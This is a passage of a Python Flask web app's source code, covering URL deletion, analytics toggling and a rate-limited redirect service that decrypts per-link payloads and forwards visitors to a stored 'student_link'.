            logger.debug(f"Toggled analytics for URL {url_id} to {new_value}")
            return jsonify({"status": "ok"}), 200
        return jsonify({"status": "error", "message": "Database unavailable"}), 500
    except Exception as e:
        logger.error(f"Error in toggle_analytics: {str(e)}", exc_info=True)
        return jsonify({"status": "error", "message": "Internal server error"}), 500

@app.route("/delete_url/<url_id>", methods=["GET"])
@login_required
def delete_url(url_id):
    try:
        username = session['username']
        if valkey_client:
            key = f"user:{username}:url:{url_id}"
            if not valkey_client.exists(key):
                logger.warning(f"URL {url_id} not found for user {username}")
                abort(404, "URL not found")
            valkey_client.delete(key)
            valkey_client.delete(f"url_payload:{url_id}")
            logger.debug(f"Deleted URL {url_id}")
            return redirect(url_for('dashboard'))
        return render_template_string("""
            <!DOCTYPE html>
            <html lang="en">
            <head>
                <meta charset="UTF-8">
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <title>Error</title>
                <script src="https://cdn.tailwindcss.com"></script>
            </head>
            <body class="min-h-screen bg-gray-100 flex items-center justify-center p-4">
                <div class="bg-white p-8 rounded-xl shadow-lg max-w-sm w-full text-center">
                    <h3 class="text-lg font-bold mb-4 text-red-600">Error</h3>
                    <p class="text-gray-600">Database unavailable. Unable to delete URL.</p>
                </div>
            </body>
            </html>
        """), 500
    except Exception as e:
        logger.error(f"Error in delete_url: {str(e)}", exc_info=True)
        return render_template_string("""
            <!DOCTYPE html>
            <html lang="en">
            <head>
                <meta charset="UTF-8">
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <title>Internal Server Error</title>
                <script src="https://cdn.tailwindcss.com"></script>
            </head>
            <body class="min-h-screen bg-gray-100 flex items-center justify-center p-4">
                <div class="bg-white p-8 rounded-xl shadow-lg max-w-sm w-full text-center">
                    <h3 class="text-lg font-bold mb-4 text-red-600">Internal Server Error</h3>
                    <p class="text-gray-600">Something went wrong. Please try again later.</p>
                </div>
            </body>
            </html>
        """), 500

@app.route("/<endpoint>/<path:encrypted_payload>/<path:path_segment>", methods=["GET"], subdomain="<username>")
@dynamic_rate_limit(base_limit=5, base_per=60)
def redirect_handler(username, endpoint, encrypted_payload, path_segment):
    try:
        base_domain = get_base_domain()
        logger.debug(f"Redirect handler: username={username}, endpoint={endpoint}, payload={encrypted_payload[:20]}...")
        url_id = hashlib.sha256(f"{endpoint}{encrypted_payload}".encode()).hexdigest()

        # Random delay
        time.sleep(random.uniform(0.1, 0.5))

        if valkey_client:
            analytics_enabled = valkey_client.hget(f"user:{username}:url:{url_id}", "analytics_enabled") == "1"
            if analytics_enabled:
                valkey_client.hincrby(f"user:{username}:url:{url_id}", "clicks", 1)

        encrypted_payload = urllib.parse.unquote(encrypted_payload)
        uuid_suffix_pattern = r'(/[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}[0-9a-f]+)?$'
        cleaned_path_segment = re.sub(uuid_suffix_pattern, '', path_segment)

        payload = None
        if valkey_client:
            cached_payload = valkey_client.get(f"url_payload:{url_id}")
            if cached_payload:
                payload = cached_payload

        if not payload:
            try:
                payload = decrypt_payload(encrypted_payload)
                if valkey_client:
                    expiry = json.loads(payload).get('expiry', int(time.time()) + 3600)
                    ttl = max(1, int(expiry - time.time()))
                    valkey_client.setex(f"url_payload:{url_id}", ttl, payload)
            except ValueError as e:
                logger.error(f"Decryption failed: {str(e)}", exc_info=True)
                return render_template_string("""
                    <!DOCTYPE html>
                    <html lang="en">
                    <head>
                        <meta charset="UTF-8">
                        <meta name="viewport" content="width=device-width, initial-scale=1.0">
                        <title>Invalid Link</title>
                        <script src="https://cdn.tailwindcss.com"></script>
                    </head>
                    <body class="min-h-screen bg-gray-100 flex items-center justify-center p-4">
                        <div class="bg-white p-8 rounded-xl shadow-lg max-w-sm w-full text-center">
                            <h3 class="text-lg font-bold mb-4 text-red-600">Invalid Link</h3>
                            <p class="text-gray-600">The link is invalid or has expired. Please try generating a new link or contact support.</p>
                        </div>
                    </body>
                    </html>
                """), 400

        try:
            data = json.loads(payload)
            redirect_url = data.get("student_link")
            expiry = data.get("expiry", float('inf'))
            if not redirect_url or not re.match(r"^https?://", redirect_url):
                logger.error(f"Invalid redirect URL: {redirect_url}")
                abort(400, "Invalid redirect URL")
            if time.time() > expiry:
                logger.warning("URL expired")
                if valkey_client:
                    valkey_client.delete(f"url_payload:{url_id}")
                abort(410, "URL has expired")
        except Exception as e:
            logger.error(f"Payload parsing error: {str(e)}", exc_info=True)
            abort(400, "Invalid payload")

        final_url = f"{redirect_url.rstrip('/')}/{cleaned_path_segment.lstrip('/')}"
        logger.info(f"Redirecting to {final_url}")
        return redirect(final_url, code=302)
    except Exception as e:
        logger.error(f"Error in redirect_handler: {str(e)}", exc_info=True)
        return render_template_string("""
            <!DOCTYPE html>
            <html lang="en">
            <head>
                <meta charset="UTF-8">
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <title>Internal Server Error</title>
                <script src="https://cdn.tailwindcss.com"></script>
            </head>
            <body class="min-h-screen bg-gray-100 flex items-center justify-center p-4">
                <div class="bg-white p-8 rounded-xl shadow-lg max-w-sm w-full text-center">
                    <h3 class="text-lg font-bold mb-4 text-red-600">Internal Server Error</h3>
                    <p class="text-gray-600">Something went wrong: {{ error }}</p>
                    <p class="text-gray-600">Please try again later or contact support.</p>
                </div>
            </body>
            </html>
        """, error=str(e)), 500

@app.route("/<endpoint>/<path:encrypted_payload>/<path:path_segment>", methods=["GET"])
@dynamic_rate_limit(base_limit=5, base_per=60)
def redirect_handler_no_subdomain(endpoint, encrypted_payload, path_segment):
    try:
        host = request.host
        username = host.split('.')[0] if '.' in host else "default"
        logger.debug(f"Fallback redirect handler: username={username}, endpoint={endpoint}")
        return redirect_handler(username, endpoint, encrypted_payload, path_segment)
    except Exception as e:
        logger.error(f"Error in redirect_handler_no_subdomain: {str(e)}", exc_info=True)
        return render_template_string("""
            <!DOCTYPE html>
            <html lang="en">
            <head>
                <meta charset="UTF-8">
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <title>Internal Server Error</title>
                <script src="https://cdn.tailwindcss.com"></script>
            </head>
            <body class="min-h-screen bg-gray-100 flex items-center justify-center p-4">
                <div class="bg-white p-8 rounded-xl shadow-lg max-w-sm w-full text-center">
                    <h3 class="text-lg font-bold mb-4 text-red-600">Internal Server Error</h3>
                    <p class="text-gray-600">Something went wrong: {{ error }}</p>
                    <p class="text-gray-600">Please try again later or contact support.</p>
                </div>
            </body>
            </html>
        """, error=str(e)), 500

@app.route("/<path:path>", methods=["GET"])
def catch_all(path):
    logger.warning(f"404 Not Found for path: {path}, host: {request.host}")
    return render_template_string("""
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Not Found</title>
            <script src="https://cdn.tailwindcss.com"></script>
        </head>
        <body class="min-h-screen bg-gray-100 flex items-center justify-center p-4">
            <div class="bg-white p-8 rounded-xl shadow-lg max-w-sm w-full text-center">
                <h3 class="text-lg font-bold mb-4 text-red-600">Not Found</h3>
                <p class="text-gray-600">The requested URL was not found on the server.</p>
                <p class="text-gray-600">Please check your spelling and try again.</p>
            </div>
        </body>
        </html>
    """), 404

if __name__ == "__main__":
    try:
        app.run(host="0.0.0.0", port=5000, debug=False)
    except Exception as e:
        logger.error(f"Error starting Flask app: {str(e)}", exc_info=True)
        sys.exit(1)
